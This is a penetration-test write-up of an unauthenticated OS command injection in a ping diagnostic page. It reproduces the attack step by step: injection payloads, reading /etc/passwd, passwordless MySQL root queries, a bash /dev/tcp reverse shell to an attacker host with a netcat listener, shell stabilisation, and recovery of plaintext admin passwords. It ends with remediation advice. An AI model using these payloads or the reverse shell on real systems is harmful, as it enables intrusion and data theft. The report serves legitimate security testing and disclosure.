# OS Command Injection (Connectivity Diagnostics Tool)

| Field | Value |
|---|---|
| **Severity** | Critical (CVSS v3.1: 9.8) |
| **CVSS Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **WSTG** | WSTG-INPV-12 (Testing for Command Injection) |
| **MITRE ATT&CK** | T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter) |
| **CWE** | CWE-78 (Improper Neutralization of Special Elements used in an OS Command) |
| **Affected endpoint** | `GET /tools.php`, parameter `host` |
| **Authentication** | None required (confirmed unauthenticated) |

## Summary

The Connectivity Diagnostics tool at `tools.php` runs a `ping` against a user-supplied host and passes the `host` value into a shell command without sanitization. By appending a shell metacharacter and a second command, an attacker executes arbitrary operating system commands on the server as the `www-data` account. The tool is reachable by anyone, the request is a simple GET with the payload in the query string, and the field has no effective input filtering, so the attack works directly in the application form with no authentication, no proxy, and no filter bypass. Command execution chains into the local MySQL service, which runs as root with no password, giving the attacker full access to the application database.

## Reproduction

### 1. Establish a baseline

The tester navigated to `tools.php`, which is reachable by anyone, submitted a normal host value of `127.0.0.1`, and confirmed the tool returned standard `ping` output. The request was captured and sent to Burp Repeater. Because the output is reflected back in the page, injected command output is easy to observe.

<img width="1202" height="417" alt="image" src="https://github.com/user-attachments/assets/f03fd183-8084-4c3f-9243-78c2c468b2e3" />

### 2. Test for injection

The tester submitted the following value in the `host` field:

```
127.0.0.1; id
```

The response returned the normal ping output followed by the output of `id`, confirming OS command injection:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The semicolon ends the `ping` command and the shell runs `id` as a second command.

<img width="1249" height="437" alt="image" src="https://github.com/user-attachments/assets/169bbfe2-f00f-4d74-853b-6325ac084a64" />

### 3. Demonstrate reach

The tester then ran further enumeration commands through the same field to document the level of access.

`127.0.0.1; whoami` confirmed the executing account:

<img width="1220" height="430" alt="image" src="https://github.com/user-attachments/assets/0af4d587-4dea-48b4-bf6d-99d9d17b80db" />

`127.0.0.1; uname -a` returned the operating system, kernel, and the container hostname `362d0d1c6207`:

<img width="1160" height="414" alt="image" src="https://github.com/user-attachments/assets/35775c19-122e-4bf6-9ab0-30da24938938" />

`127.0.0.1; cat /etc/passwd` confirmed arbitrary file read and showed that a `mysql` service account is present on the same host:

<img width="1161" height="756" alt="image" src="https://github.com/user-attachments/assets/272efc60-eacb-419a-b069-5843f021ff60" />

### 4. Chain to the database

Because the install notes disclosed that MySQL runs locally as root with no password, the tester chained the command injection into the database:

```
127.0.0.1; mysql -u root -e "show databases;"
```

The response listed the server's databases, including the application schema `oas`, confirming full database access with no database credentials required:

```
Database
information_schema
mysql
oas
performance_schema
```

<img width="1156" height="421" alt="image" src="https://github.com/user-attachments/assets/fdc8b70f-e163-4016-84cc-ddb2feed3922" />

### 5. Confirm no authentication is required

The tester repeated the injection with no session cookie set. The request carries an empty `Cookie` header and still executes the command, which confirms the vulnerability is exploitable completely unauthenticated. The request is also a GET, so the attack can be delivered as a single crafted URL.

<img width="1814" height="960" alt="image" src="https://github.com/user-attachments/assets/93c4d44d-ba1f-4578-a005-ce4370731931" />

## Post-Exploitation: Interactive Shell

The command injection was escalated from single commands to a full interactive foothold, then used to compromise the database and recover administrator credentials, demonstrating the end-to-end impact of the flaw.

### Reverse shell

A listener was started on the attacking host:

```bash
rlwrap nc -lvnp 4444
```

A reverse-shell payload was then injected through the `host` field:

```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.77.2/4444 0>&1'
```

The semicolon runs the payload after the ping, `bash -c` forces execution in bash, and bash's `/dev/tcp` feature opens a connection back to the listener, returning a shell as `www-data`.

<!-- paste your reverse-shell screenshot here (payload injection + listener opening the session); the tag you sent came through malformed -->

### Stabilizing the shell

The raw netcat shell has no job control or terminal features, so it was upgraded to a proper pseudo-terminal.

```bash
script -qc /bin/bash /dev/null
```

- `script` is a standard Linux utility that normally records a terminal session. Invoked this way it spawns an interactive bash inside a pseudo-terminal (PTY), which is what upgrades the limited shell into one that supports interactive programs and job control. `-q` suppresses its banner, `-c /bin/bash` is the command to run, and `/dev/null` discards the session log.

Then, on the attacking host:

```bash
[Ctrl+Z]
stty raw -echo; fg
```

- **Ctrl+Z** suspends the remote shell and hands control back to the local terminal so its settings can be changed.
- `stty raw` puts the local terminal into raw mode so that keystrokes, including Ctrl+C, Tab, and the arrow keys, pass straight through to the remote shell instead of being interpreted locally.
- `-echo` disables local echo, since the remote PTY now handles displaying typed input.
- `fg` brings the suspended shell back to the foreground.

Finally, in the shell:

```bash
export TERM=xterm
```

- Sets the terminal type so full-screen programs such as `clear`, `nano`, and `vim` know how to control the display.

The result is a fully interactive terminal as `www-data`.

<img width="630" height="194" alt="image" src="https://github.com/user-attachments/assets/a5fde40a-a2e7-4411-8b23-67543880ab7a" />

### Mapping the database

From the shell, the database was accessed directly as the MySQL root account, which the install notes disclosed uses no password, and the tables were enumerated:

```bash
mysql -u root oas -e "show tables;"
```

This revealed the schema, including `t_admin` (administrator credentials), `t_user`, `t_user_data`, `t_userdoc`, and `t_usermark`.

<img width="666" height="206" alt="image" src="https://github.com/user-attachments/assets/3de6c8c7-ef1a-485c-a388-3ddff5d8ca43" />

### Reviewing the application source

A listing of the web root exposed the full application source. The three document upload directories (`studentdoc`, `studentpic`, `studentproof`) are owned by `www-data` and are writable, while the core application files are owned by root. This confirms the shell account can write into web-reachable directories, which supports the separate file-upload findings.

<img width="657" height="1084" alt="image" src="https://github.com/user-attachments/assets/ed914875-b5ac-41ac-8b1c-d8df53fda267" />

### Recovering administrator credentials

Finally, the administrator table was queried:

```bash
mysql -u root oas -e "select * from t_admin;"
```

The passwords are stored in plaintext in the `ad_pswd` column, so every administrator credential, including the super-admin `AD00000001`, was recovered directly with no cracking required. This plaintext storage is itself a separate finding (cleartext storage of credentials, CWE-256).

> Redact the `ad_pswd` values in this screenshot before committing, since the repository is public.

<img width="742" height="184" alt="image" src="https://github.com/user-attachments/assets/55336c34-a550-4446-9603-ecc047fe15c3" />

## Impact

This is a critical vulnerability. Any unauthenticated attacker who can reach the diagnostics tool gains arbitrary command execution on the server as the `www-data` account, which includes reading local files such as `/etc/passwd` and the application source. Command execution reaches the local MySQL service, which runs as root with no password, so the attacker can read, modify, or delete the entire `oas` database, including applicant personal data, stored credentials, marks, and administrator accounts. A single unauthenticated web request therefore leads to total compromise of the application and its data.

Execution occurs as `www-data` inside a container, since the hostname `362d0d1c6207` is a container identifier, which limits host-level reach. The application and its database are reachable from that same context, so the practical impact remains full compromise of the application and its data. The command injection was escalated to an interactive reverse shell as `www-data`, which was then used to access the MySQL database as root and recover the full administrator credential store, which is stored in plaintext (see Post-Exploitation above). Establishing persistence, such as planting a web shell, cron job, or SSH key, and pivoting to other hosts were not performed, in order to limit impact during testing.

## Remediation

- Do not pass user input to a shell. If a host must be pinged, call the system binary through an argument-array API that does not invoke a shell, for example `exec()` with a fixed command and an arguments list, rather than `system()` or `shell_exec()` with a concatenated string.
- Validate the `host` value against a strict allow-list, for example an IP address or hostname pattern, and reject anything that does not match. Perform this validation on the server, since client-side checks are bypassed.
- Require authentication and authorization to reach diagnostic tooling, and remove it from production where it is not required.
- Run the web application and the database with least privilege. The database account should not be root, and it should require a strong password.

## References

- OWASP WSTG-INPV-12: Testing for Command Injection
- CWE-78: Improper Neutralization of Special Elements used in an OS Command
